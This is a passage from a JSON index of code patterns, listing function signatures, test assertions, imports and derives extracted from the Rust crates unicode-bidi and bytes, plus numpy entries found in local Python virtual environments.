          "#[derive(Debug)]",
          "#[derive(Debug)]"
        ],
        "error_handling": 3
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/level.rs",
        "function_defs": [
          "fn from(val: Level) -> Self {",
          "fn from(number: u8) -> Level {",
          "fn eq(&self, s: &&'a str) -> bool {",
          "fn eq(&self, s: &String) -> bool {",
          "fn test_new() {",
          "fn test_new_explicit() {",
          "fn test_is_ltr() {",
          "fn test_is_rtl() {",
          "fn test_raise() {",
          "fn test_raise_explicit() {",
          "fn test_lower() {",
          "fn test_has_rtl() {",
          "fn test_into() {",
          "fn test_vec() {",
          "fn test_str_eq() {",
          "fn test_string_eq() {",
          "fn test_statics() {",
          "fn test_new() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Level {",
          "impl From<Level> for u8 {",
          "impl From<u8> for Level {",
          "impl PartialEq<String> for Level {"
        ],
        "uses": [
          "use alloc::{",
          "use core::slice;",
          "use super::char_data::BidiClass;",
          "use super::*;",
          "use super::*;",
          "use serde_test::{assert_tokens, Token};"
        ],
        "macros": [
          "debug_assert_eq!(core::mem::size_of::<u8>(), core::mem::size_of::<Level>());",
          "assert_eq!(Level::new(0), Ok(Level(0)));",
          "assert_eq!(Level::new(1), Ok(Level(1)));",
          "assert_eq!(Level::new(10), Ok(Level(10)));",
          "assert_eq!(Level::new(125), Ok(Level(125)));",
          "assert_eq!(Level::new(126), Ok(Level(126)));",
          "assert_eq!(Level::new(127), Err(Error::OutOfRangeNumber));",
          "assert_eq!(Level::new(255), Err(Error::OutOfRangeNumber));",
          "assert_eq!(Level::new_explicit(0), Ok(Level(0)));",
          "assert_eq!(Level::new_explicit(1), Ok(Level(1)));",
          "assert_eq!(Level::new_explicit(10), Ok(Level(10)));",
          "assert_eq!(Level::new_explicit(125), Ok(Level(125)));",
          "assert_eq!(Level::new_explicit(126), Err(Error::OutOfRangeNumber));",
          "assert_eq!(Level::new_explicit(255), Err(Error::OutOfRangeNumber));",
          "assert_eq!(Level(0).is_ltr(), true);",
          "assert_eq!(Level(1).is_ltr(), false);",
          "assert_eq!(Level(10).is_ltr(), true);",
          "assert_eq!(Level(11).is_ltr(), false);",
          "assert_eq!(Level(124).is_ltr(), true);",
          "assert_eq!(Level(125).is_ltr(), false);",
          "assert_eq!(Level(0).is_rtl(), false);",
          "assert_eq!(Level(1).is_rtl(), true);",
          "assert_eq!(Level(10).is_rtl(), false);",
          "assert_eq!(Level(11).is_rtl(), true);",
          "assert_eq!(Level(124).is_rtl(), false);",
          "assert_eq!(Level(125).is_rtl(), true);",
          "assert_eq!(level.number(), 0);",
          "assert!(level.raise(100).is_ok());",
          "assert_eq!(level.number(), 100);",
          "assert!(level.raise(26).is_ok());",
          "assert_eq!(level.number(), 126);",
          "assert!(level.raise(1).is_err()); // invalid!",
          "assert!(level.raise(250).is_err()); // overflow!",
          "assert_eq!(level.number(), 126);",
          "assert_eq!(level.number(), 0);",
          "assert!(level.raise_explicit(100).is_ok());",
          "assert_eq!(level.number(), 100);",
          "assert!(level.raise_explicit(25).is_ok());",
          "assert_eq!(level.number(), 125);",
          "assert!(level.raise_explicit(1).is_err()); // invalid!",
          "assert!(level.raise_explicit(250).is_err()); // overflow!",
          "assert_eq!(level.number(), 125);",
          "assert_eq!(level.number(), 1);",
          "assert!(level.lower(1).is_ok());",
          "assert_eq!(level.number(), 0);",
          "assert!(level.lower(1).is_err()); // underflow!",
          "assert!(level.lower(250).is_err()); // underflow!",
          "assert_eq!(level.number(), 0);",
          "assert_eq!(has_rtl(&Level::vec(&[0, 0, 0])), false);",
          "assert_eq!(has_rtl(&Level::vec(&[0, 1, 0])), true);",
          "assert_eq!(has_rtl(&Level::vec(&[0, 2, 0])), false);",
          "assert_eq!(has_rtl(&Level::vec(&[0, 125, 0])), true);",
          "assert_eq!(has_rtl(&Level::vec(&[0, 126, 0])), false);",
          "assert_eq!(1u8, number);",
          "assert_eq!(",
          "assert_eq!(Level::vec(&[0, 1, 4, 125]), vec![\"0\", \"1\", \"x\", \"125\"]);",
          "assert_ne!(Level::vec(&[0, 1, 4, 125]), vec![\"0\", \"1\", \"5\", \"125\"]);",
          "assert_eq!("
        ],
        "derives": [
          "#[derive(Copy, Clone, Debug, Eq, Ord, PartialEq, PartialOrd)]",
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/char_data/mod.rs",
        "function_defs": [
          "fn bidi_class(&self, c: char) -> BidiClass {",
          "fn bsearch_range_value_table(c: char, r: &'static [(char, char, BidiClass)]) -> BidiClass {",
          "fn test_ascii() {",
          "fn test_bmp() {",
          "fn test_smp() {",
          "fn test_unassigned_planes() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl BidiDataSource for HardcodedBidiData {"
        ],
        "uses": [
          "use core::char;",
          "use core::cmp::Ordering::{Equal, Greater, Less};",
          "use self::tables::bidi_class_table;",
          "use crate::data_source::BidiMatchedOpeningBracket;",
          "use crate::BidiClass::*;",
          "use crate::BidiDataSource;",
          "use super::*;"
        ],
        "macros": [
          "matches!(bidi_class, RLE | RLO | RLI)",
          "assert_eq!(bidi_class('\\u{0000}'), BN);",
          "assert_eq!(bidi_class('\\u{0040}'), ON);",
          "assert_eq!(bidi_class('\\u{0041}'), L);",
          "assert_eq!(bidi_class('\\u{0062}'), L);",
          "assert_eq!(bidi_class('\\u{007F}'), BN);",
          "assert_eq!(bidi_class('\\u{0590}'), R);",
          "assert_eq!(bidi_class('\\u{05D0}'), R);",
          "assert_eq!(bidi_class('\\u{05D1}'), R);",
          "assert_eq!(bidi_class('\\u{05FF}'), R);",
          "assert_eq!(bidi_class('\\u{0600}'), AN);",
          "assert_eq!(bidi_class('\\u{0627}'), AL);",
          "assert_eq!(bidi_class('\\u{07BF}'), AL);",
          "assert_eq!(bidi_class('\\u{07C0}'), R);",
          "assert_eq!(bidi_class('\\u{085F}'), R);",
          "assert_eq!(bidi_class('\\u{0860}'), AL);",
          "assert_eq!(bidi_class('\\u{0870}'), AL);",
          "assert_eq!(bidi_class('\\u{089F}'), NSM);",
          "assert_eq!(bidi_class('\\u{08A0}'), AL);",
          "assert_eq!(bidi_class('\\u{089F}'), NSM);",
          "assert_eq!(bidi_class('\\u{08FF}'), NSM);",
          "assert_eq!(bidi_class('\\u{20A0}'), ET);",
          "assert_eq!(bidi_class('\\u{20CF}'), ET);",
          "assert_eq!(bidi_class('\\u{FB1D}'), R);",
          "assert_eq!(bidi_class('\\u{FB4F}'), R);",
          "assert_eq!(bidi_class('\\u{FB50}'), AL);",
          "assert_eq!(bidi_class('\\u{FDCF}'), ON);",
          "assert_eq!(bidi_class('\\u{FDF0}'), AL);",
          "assert_eq!(bidi_class('\\u{FDFF}'), ON);",
          "assert_eq!(bidi_class('\\u{FE70}'), AL);",
          "assert_eq!(bidi_class('\\u{FEFE}'), AL);",
          "assert_eq!(bidi_class('\\u{FEFF}'), BN);",
          "assert_eq!(bidi_class('\\u{FDD0}'), L);",
          "assert_eq!(bidi_class('\\u{FDD1}'), L);",
          "assert_eq!(bidi_class('\\u{FDEE}'), L);",
          "assert_eq!(bidi_class('\\u{FDEF}'), L);",
          "assert_eq!(bidi_class('\\u{FFFE}'), L);",
          "assert_eq!(bidi_class('\\u{FFFF}'), L);",
          "assert_eq!(bidi_class('\\u{10800}'), R);",
          "assert_eq!(bidi_class('\\u{10FFF}'), R);",
          "assert_eq!(bidi_class('\\u{1E800}'), R);",
          "assert_eq!(bidi_class('\\u{1EDFF}'), R);",
          "assert_eq!(bidi_class('\\u{1EE00}'), AL);",
          "assert_eq!(bidi_class('\\u{1EEFF}'), AL);",
          "assert_eq!(bidi_class('\\u{1EF00}'), R);",
          "assert_eq!(bidi_class('\\u{1EFFF}'), R);",
          "assert_eq!(bidi_class('\\u{30000}'), L);",
          "assert_eq!(bidi_class('\\u{40000}'), L);",
          "assert_eq!(bidi_class('\\u{50000}'), L);",
          "assert_eq!(bidi_class('\\u{60000}'), L);",
          "assert_eq!(bidi_class('\\u{70000}'), L);",
          "assert_eq!(bidi_class('\\u{80000}'), L);",
          "assert_eq!(bidi_class('\\u{90000}'), L);",
          "assert_eq!(bidi_class('\\u{a0000}'), L);"
        ],
        "derives": [],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/unicode-bidi-0.3.18/src/char_data/tables.rs",
        "function_defs": [],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use self::BidiClass::*;"
        ],
        "macros": [],
        "derives": [
          "#[derive(Clone, Copy, Debug, PartialEq, Eq)]"
        ],
        "error_handling": 0
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/RVC_venv/lib/python3.11/site-packages/numpy/random",
    "name": "random",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/venvs/SAM_voice_venv/lib/python3.11/site-packages/numpy/random",
    "name": "random",
    "languages": [
      "Python"
    ],
    "python_patterns": [],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0",
    "name": "bytes-1.11.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_buf.rs",
        "function_defs": [
          "fn empty_state() {",
          "fn fresh_state() {",
          "fn advance() {",
          "fn advance_to_end() {",
          "fn advance_past_end() {",
          "fn chunks_vectored_empty() {",
          "fn chunks_vectored_is_complete() {",
          "fn copy_to_slice() {",
          "fn copy_to_slice_big() {",
          "fn copy_to_slice_to_end() {",
          "fn copy_to_slice_overflow() {",
          "fn copy_to_bytes() {",
          "fn copy_to_bytes_big() {",
          "fn copy_to_bytes_to_end() {",
          "fn copy_to_bytes_overflow() {",
          "fn $ok_name() {",
          "fn $panic_name() {",
          "fn $ok_name() {",
          "fn $panic_name() {",
          "fn make_input(buf: &'static [u8]) -> &'static [u8] {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn make_input(buf: &'static [u8]) -> impl Buf {",
          "fn test_deref_buf_forwards() {",
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, _: usize) {",
          "fn get_u8(&mut self) -> u8 {"
        ],
        "struct_defs": [
          "struct Special;"
        ],
        "impl_blocks": [
          "impl Buf for Special {"
        ],
        "uses": [
          "use ::bytes::{Buf, Bytes, BytesMut};",
          "use core::{cmp, mem};",
          "use std::collections::VecDeque;",
          "use std::io::IoSlice;",
          "use super::*;",
          "use std::io::Cursor;"
        ],
        "macros": [
          "if cfg!(target_endian = \"big\") {",
          "buf_tests!($make_input, true);",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert!(buf.chunk().is_empty());",
          "assert_eq!(buf.remaining(), 64);",
          "assert!(buf.has_remaining());",
          "assert!(chunk.len() <= 64);",
          "assert!(INPUT.starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert!(chunk.is_empty());",
          "assert_eq!(n, 0);",
          "assert!(bufs.iter().all(|buf| buf.is_empty()));",
          "assert!(n > 0);",
          "assert!(n <= 16);",
          "assert_eq!(bufs_concat, INPUT);",
          "assert!(bufs_concat.len() < INPUT.len());",
          "assert!(INPUT.starts_with(&bufs_concat));",
          "assert!(bufs[i].is_empty());",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..8]);",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 56);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..56]);",
          "assert!(chunk.len() <= 64 - 56);",
          "assert!(INPUT[56..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert_eq!(chunk, INPUT);",
          "assert!(buf.chunk().is_empty());",
          "assert_eq!(buf.remaining(), 64 - 8);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..8]);",
          "assert!(chunk.len() <= 64 - 8);",
          "assert!(INPUT[8..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 64 - 56);",
          "assert!(buf.has_remaining());",
          "assert_eq!(chunk, INPUT[..56]);",
          "assert!(chunk.len() <= 64 - 56);",
          "assert!(INPUT[56..].starts_with(chunk));",
          "assert_eq!(buf.remaining(), 0);",
          "assert!(!buf.has_remaining());",
          "assert_eq!(chunk, INPUT);",
          "assert!(buf.chunk().is_empty());",
          "buf_tests!(number $make_input, get_u8, get_u8_overflow, u8, get_u8, 0xff);",
          "buf_tests!(number $make_input, get_i8, get_i8_overflow, i8, get_i8, 0xffu8 as i8",
          "buf_tests!(number $make_input, get_u16_be, get_u16_be_overflow, u16, get_u16, 0x",
          "buf_tests!(number $make_input, get_u16_le, get_u16_le_overflow, u16, get_u16_le,",
          "buf_tests!(number $make_input, get_u16_ne, get_u16_ne_overflow, u16, get_u16_ne,",
          "buf_tests!(number $make_input, get_i16_be, get_i16_be_overflow, i16, get_i16, 0x",
          "buf_tests!(number $make_input, get_i16_le, get_i16_le_overflow, i16, get_i16_le,",
          "buf_tests!(number $make_input, get_i16_ne, get_i16_ne_overflow, i16, get_i16_ne,",
          "buf_tests!(number $make_input, get_u32_be, get_u32_be_overflow, u32, get_u32, 0x",
          "buf_tests!(number $make_input, get_u32_le, get_u32_le_overflow, u32, get_u32_le,",
          "buf_tests!(number $make_input, get_u32_ne, get_u32_ne_overflow, u32, get_u32_ne,",
          "buf_tests!(number $make_input, get_i32_be, get_i32_be_overflow, i32, get_i32, 0x",
          "buf_tests!(number $make_input, get_i32_le, get_i32_le_overflow, i32, get_i32_le,",
          "buf_tests!(number $make_input, get_i32_ne, get_i32_ne_overflow, i32, get_i32_ne,",
          "buf_tests!(number $make_input, get_u64_be, get_u64_be_overflow, u64, get_u64, 0x",
          "buf_tests!(number $make_input, get_u64_le, get_u64_le_overflow, u64, get_u64_le,",
          "buf_tests!(number $make_input, get_u64_ne, get_u64_ne_overflow, u64, get_u64_ne,",
          "buf_tests!(number $make_input, get_i64_be, get_i64_be_overflow, i64, get_i64, 0x",
          "buf_tests!(number $make_input, get_i64_le, get_i64_le_overflow, i64, get_i64_le,",
          "buf_tests!(number $make_input, get_i64_ne, get_i64_ne_overflow, i64, get_i64_ne,",
          "buf_tests!(number $make_input, get_u128_be, get_u128_be_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_u128_le, get_u128_le_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_u128_ne, get_u128_ne_overflow, u128, get_u128",
          "buf_tests!(number $make_input, get_i128_be, get_i128_be_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_i128_le, get_i128_le_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_i128_ne, get_i128_ne_overflow, i128, get_i128",
          "buf_tests!(number $make_input, get_f32_be, get_f32_be_overflow, f32, get_f32, f3",
          "buf_tests!(number $make_input, get_f32_le, get_f32_le_overflow, f32, get_f32_le,",
          "buf_tests!(number $make_input, get_f32_ne, get_f32_ne_overflow, f32, get_f32_ne,",
          "buf_tests!(number $make_input, get_f64_be, get_f64_be_overflow, f64, get_f64, f6",
          "buf_tests!(number $make_input, get_f64_le, get_f64_le_overflow, f64, get_f64_le,",
          "buf_tests!(number $make_input, get_f64_ne, get_f64_ne_overflow, f64, get_f64_ne,",
          "buf_tests!(var_number $make_input, get_uint_be, get_uint_be_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_uint_le, get_uint_le_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_uint_ne, get_uint_ne_overflow, u64, get_u",
          "buf_tests!(var_number $make_input, get_int_be, get_int_be_overflow, i64, get_int",
          "buf_tests!(var_number $make_input, get_int_le, get_int_le_overflow, i64, get_int",
          "buf_tests!(var_number $make_input, get_int_ne, get_int_ne_overflow, i64, get_int",
          "assert_eq!(buf.remaining(), 64 - mem::size_of::<$number>());",
          "assert!(buf.has_remaining());",
          "assert_eq!(value, $value);",
          "assert_eq!(buf.remaining(), 64 - $len);",
          "assert!(buf.has_remaining());",
          "assert_eq!(value, $value);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "assert!(",
          "assert!(",
          "buf_tests!(make_input, true);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input);",
          "buf_tests!(make_input, true);",
          "unreachable!(\"remaining\");",
          "unreachable!(\"chunk\");",
          "unreachable!(\"advance\");",
          "assert_eq!(Special.get_u8(), b'x');",
          "assert_eq!((&mut Special as &mut dyn Buf).get_u8(), b'x');",
          "assert_eq!((Box::new(Special) as Box<dyn Buf>).get_u8(), b'x');",
          "assert_eq!(Box::new(Special).get_u8(), b'x');"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_bytes_odd_alloc.rs",
        "function_defs": [
          "fn sanity_check_odd_allocator() {",
          "fn test_bytes_from_vec_drop() {",
          "fn test_bytes_clone_drop() {",
          "fn test_bytes_into_vec() {",
          "fn test_bytesmut_from_bytes_vec() {",
          "fn test_bytesmut_from_bytes_arc_1() {",
          "fn test_bytesmut_from_bytes_arc_2() {",
          "fn test_bytesmut_from_bytes_arc_offset() {"
        ],
        "struct_defs": [
          "struct Odd;"
        ],
        "impl_blocks": [],
        "uses": [
          "use std::alloc::{GlobalAlloc, Layout, System};",
          "use std::ptr;",
          "use bytes::{Bytes, BytesMut};"
        ],
        "macros": [
          "assert!(p & 0x1 == 0x1, \"{:#b}\", p);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b1), vec);",
          "assert_eq!(Vec::from(b2), vec);",
          "assert_eq!(Vec::from(b2), vec[20..]);",
          "assert_eq!(Vec::from(b1), vec[..20]);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b1m, vec);",
          "assert_eq!(b2m, vec);",
          "assert_eq!(b2m, vec[20..]);",
          "assert_eq!(b1m, vec[..20]);"
        ],
        "derives": [],
        "error_handling": 2
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/tests/test_bytes.rs",
        "function_defs": [
          "fn is_sync<T: Sync>() {}",
          "fn is_send<T: Send>() {}",
          "fn test_bounds() {",
          "fn test_layout() {",
          "fn from_slice() {",
          "fn fmt() {",
          "fn fmt_write() {",
          "fn len() {",
          "fn index() {",
          "fn slice() {",
          "fn slice_oob_1() {",
          "fn slice_oob_2() {",
          "fn slice_start_greater_than_end() {",
          "fn split_off() {",
          "fn split_off_oob() {",
          "fn bytes_mut_split_off_oob() {",
          "fn split_off_uninitialized() {",
          "fn split_off_to_loop() {",
          "fn split_to_1() {",
          "fn split_to_2() {",
          "fn split_to_oob() {",
          "fn split_to_oob_mut() {",
          "fn split_to_uninitialized() {",
          "fn split_off_to_at_gt_len() {",
          "fn make_bytes() -> Bytes {",
          "fn truncate() {",
          "fn freeze_clone_shared() {",
          "fn freeze_clone_unique() {",
          "fn freeze_after_advance() {",
          "fn freeze_after_advance_arc() {",
          "fn freeze_after_split_to() {",
          "fn freeze_after_truncate() {",
          "fn freeze_after_truncate_arc() {",
          "fn freeze_after_split_off() {",
          "fn fns_defined_for_bytes_mut() {",
          "fn reserve_convert() {",
          "fn reserve_growth() {",
          "fn reserve_allocates_at_least_original_capacity() {",
          "fn reserve_max_original_capacity_value() {",
          "fn reserve_vec_recycling() {",
          "fn reserve_in_arc_unique_does_not_overallocate() {",
          "fn reserve_in_arc_unique_doubles() {",
          "fn reserve_in_arc_unique_does_not_overallocate_after_split() {",
          "fn reserve_in_arc_unique_does_not_overallocate_after_multiple_splits() {",
          "fn reserve_in_arc_nonunique_does_not_overallocate() {",
          "fn reserve_shared_reuse() {",
          "fn extend_mut() {",
          "fn extend_from_slice_mut() {",
          "fn extend_mut_from_bytes() {",
          "fn extend_past_lower_limit_of_size_hint() {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn size_hint(&self) -> (usize, Option<usize>) {",
          "fn extend_mut_without_size_hint() {",
          "fn from_static() {",
          "fn advance_static() {",
          "fn advance_vec() {",
          "fn advance_bytes_mut() {",
          "fn advance_bytes_mut_remaining_capacity() {",
          "fn advance_past_len() {",
          "fn mut_advance_past_len() {",
          "fn stress() {",
          "fn partial_eq_bytesmut() {",
          "fn bytes_mut_unsplit_basic() {",
          "fn bytes_mut_unsplit_empty_other() {",
          "fn bytes_mut_unsplit_empty_self() {",
          "fn bytes_mut_unsplit_other_keeps_capacity() {",
          "fn bytes_mut_unsplit_empty_other_keeps_capacity() {",
          "fn bytes_mut_unsplit_arc_different() {",
          "fn bytes_mut_unsplit_arc_non_contiguous() {",
          "fn bytes_mut_unsplit_two_split_offs() {",
          "fn from_iter_no_size_hint() {",
          "fn test_slice_ref(bytes: &Bytes, start: usize, end: usize, expected: &[u8]) {",
          "fn slice_ref_works() {",
          "fn slice_ref_empty() {",
          "fn slice_ref_empty_subslice() {",
          "fn slice_ref_catches_not_a_subset() {",
          "fn slice_ref_not_an_empty_subset() {",
          "fn empty_slice_ref_not_an_empty_subset() {",
          "fn bytes_buf_mut_advance() {",
          "fn bytes_buf_mut_reuse_when_fully_consumed() {",
          "fn bytes_reserve_overflow() {",
          "fn bytes_with_capacity_but_empty() {",
          "fn bytes_put_bytes() {",
          "fn box_slice_empty() {",
          "fn bytes_into_vec() {",
          "fn test_bytes_into_vec() {",
          "fn test_bytes_into_vec_promotable_even() {",
          "fn test_bytes_vec_conversion() {",
          "fn test_bytes_mut_conversion() {",
          "fn test_bytes_capacity_len() {",
          "fn static_is_unique() {",
          "fn vec_is_unique() {",
          "fn arc_is_unique() {",
          "fn shared_is_unique() {",
          "fn mut_shared_is_unique() {",
          "fn test_bytesmut_from_bytes_static() {",
          "fn test_bytesmut_from_bytes_bytes_mut_vec() {",
          "fn test_bytesmut_from_bytes_bytes_mut_shared() {",
          "fn test_bytesmut_from_bytes_bytes_mut_offset() {",
          "fn test_bytesmut_from_bytes_promotable_even_vec() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_1() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_2() {",
          "fn test_bytesmut_from_bytes_promotable_even_arc_offset() {",
          "fn try_reclaim_empty() {",
          "fn try_reclaim_vec() {",
          "fn try_reclaim_arc() {",
          "fn slice_empty_addr() {",
          "fn split_off_empty_addr() {",
          "fn split_to_empty_addr() {",
          "fn split_off_empty_addr_mut() {",
          "fn split_to_empty_addr_mut() {",
          "fn new(buf: [u8; L], drop_count: SharedAtomicCounter) -> Self {",
          "fn as_ref(&self) -> &[u8] {",
          "fn drop(&mut self) {",
          "fn owned_is_unique_always_false() {",
          "fn owned_buf_sharing() {",
          "fn owned_buf_slicing() {",
          "fn owned_dropped_exactly_once() {",
          "fn owned_to_mut() {",
          "fn owned_to_vec() {",
          "fn owned_into_vec() {",
          "fn owned_safe_drop_on_as_ref_panic() {",
          "fn bytes_mut_put_bytes_specialization() {"
        ],
        "struct_defs": [
          "struct Iter<I>(I);",
          "struct SharedAtomicCounter(Arc<AtomicUsize>);",
          "struct OwnedTester<const L: usize> {"
        ],
        "impl_blocks": [
          "impl SharedAtomicCounter {"
        ],
        "uses": [
          "use bytes::{Buf, BufMut, Bytes, BytesMut};",
          "use std::sync::atomic::{AtomicUsize, Ordering};",
          "use std::sync::Arc;",
          "use std::panic::{self, AssertUnwindSafe};",
          "use std::mem;",
          "use std::fmt::Write;",
          "use std::panic;",
          "use std::sync::{Arc, Barrier};",
          "use std::thread;",
          "use std::iter;",
          "use bytes::{Buf, BytesMut};"
        ],
        "macros": [
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(",
          "assert_eq!(a, b\"abcdefgh\"[..]);",
          "assert_eq!(a, &b\"abcdefgh\"[..]);",
          "assert_eq!(a, Vec::from(&b\"abcdefgh\"[..]));",
          "assert_eq!(b\"abcdefgh\"[..], a);",
          "assert_eq!(&b\"abcdefgh\"[..], a);",
          "assert_eq!(Vec::from(&b\"abcdefgh\"[..]), a);",
          "assert_eq!(a, b\"abcdefgh\"[..]);",
          "assert_eq!(a, &b\"abcdefgh\"[..]);",
          "assert_eq!(a, Vec::from(&b\"abcdefgh\"[..]));",
          "assert_eq!(b\"abcdefgh\"[..], a);",
          "assert_eq!(&b\"abcdefgh\"[..], a);",
          "assert_eq!(Vec::from(&b\"abcdefgh\"[..]), a);",
          "let a = format!(\"{:?}\", Bytes::from(&b\"abcdefg\"[..]));",
          "assert_eq!(a, b);",
          "let a = format!(\"{:?}\", BytesMut::from(&b\"abcdefg\"[..]));",
          "assert_eq!(a, b);",
          "write!(a, \"{}\", &s[..64]).unwrap();",
          "assert_eq!(a, s[..64].as_bytes());",
          "write!(b, \"{}\", &s[..32]).unwrap();",
          "write!(b, \"{}\", &s[32..64]).unwrap();",
          "assert_eq!(b, s[..64].as_bytes());",
          "write!(c, \"{}\", s).unwrap();",
          "assert_eq!(c, s[..].as_bytes());",
          "assert_eq!(a.len(), 7);",
          "assert_eq!(a.len(), 7);",
          "assert!(a.is_empty());",
          "assert!(a.is_empty());",
          "assert_eq!(a[0..5], *b\"hello\");",
          "assert_eq!(b, b\"lo\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"\"[..]);",
          "assert_eq!(b, b\"hello\"[..]);",
          "assert_eq!(b, b\"lo world\"[..]);",
          "assert_eq!(hello, &b\"hello\"[..]);",
          "assert_eq!(world, &b\"world\"[..]);",
          "assert_eq!(hello, &b\"hello\"[..]);",
          "assert_eq!(world, &b\"world\"[..]);",
          "assert_eq!(bytes.len(), 0);",
          "assert_eq!(bytes.capacity(), 128);",
          "assert_eq!(other.len(), 0);",
          "assert_eq!(other.capacity(), 896);",
          "assert_eq!(i, bytes.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, bytes.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, off.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(i, off.len());",
          "assert_eq!(&s[..], &sum[..]);",
          "assert_eq!(SHORT[4..], a);",
          "assert_eq!(SHORT[..4], b);",
          "assert_eq!(LONG[4..], a);",
          "assert_eq!(LONG[..4], b);",
          "assert_eq!(LONG[30..], a);",
          "assert_eq!(LONG[..30], b);",
          "assert_eq!(LONG, a);",
          "assert_eq!(LONG[1..], a);",
          "assert!(panic::catch_unwind(move || {",
          "assert!(panic::catch_unwind(move || {",
          "assert_eq!(hello, s);",
          "assert_eq!(hello, s);",
          "assert_eq!(hello, \"hello\");",
          "assert_eq!(b, s);",
          "assert_eq!(c, s);",
          "assert_eq!(b, s);",
          "assert_eq!(c, s);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[1..]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(b, s[..7]);",
          "assert_eq!(&v[..], bytes);",
          "assert_eq!(bytes.capacity(), LONG.len() + 64);",
          "assert!(bytes.capacity() >= bytes.len() + 128);",
          "assert_eq!(bytes.capacity(), 117);",
          "assert_eq!(bytes.capacity(), 1024);",
          "assert_eq!(bytes.capacity(), 64 * 1024);",
          "assert_eq!(bytes.capacity(), 16);",
          "assert_eq!(bytes.as_ptr() as usize, addr);",
          "assert_eq!(bytes.capacity(), 6);",
          "assert_eq!(bytes.capacity(), 16);",
          "assert_eq!(bytes.as_ptr() as usize, addr);",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2001, bytes.capacity());",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2000, bytes.capacity());",
          "assert_eq!(bytes.capacity(), orig_capacity);",
          "assert_eq!(bytes.capacity(), orig_capacity);",
          "assert_eq!(1000, bytes.capacity());",
          "assert_eq!(2001, bytes.capacity());",
          "assert_eq!(&*bytes, b\"!123ex123\");",
          "assert_eq!(&*bytes, b\"!123ex123\");",
          "assert_eq!(bytes.capacity(), 2009);",
